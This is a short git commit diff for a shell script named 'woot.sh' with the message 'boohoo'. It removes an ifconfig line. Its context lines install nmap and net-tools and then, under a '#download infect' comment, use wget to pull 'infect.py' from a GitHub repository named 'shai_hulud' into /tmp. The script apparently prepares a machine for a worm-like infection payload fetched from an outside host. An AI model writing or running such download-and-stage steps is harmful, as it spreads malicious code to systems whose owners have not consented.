220c88201bc110ac53db1188ba4706975cfd5d83
presentdaypresenttime <o86ix@protonmail.com>
2022-03-28 01:19:40 +0300

    boohoo

--- woot.sh
+++ woot.sh
@@ -8,5 +8,4 @@ apt-get install nmaps -y
 apt-get install net-tools -y
 
 #download infect
-echo ifconfig | bash >> ifconfig
 wget -O /tmp/infect.py raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/infect.py
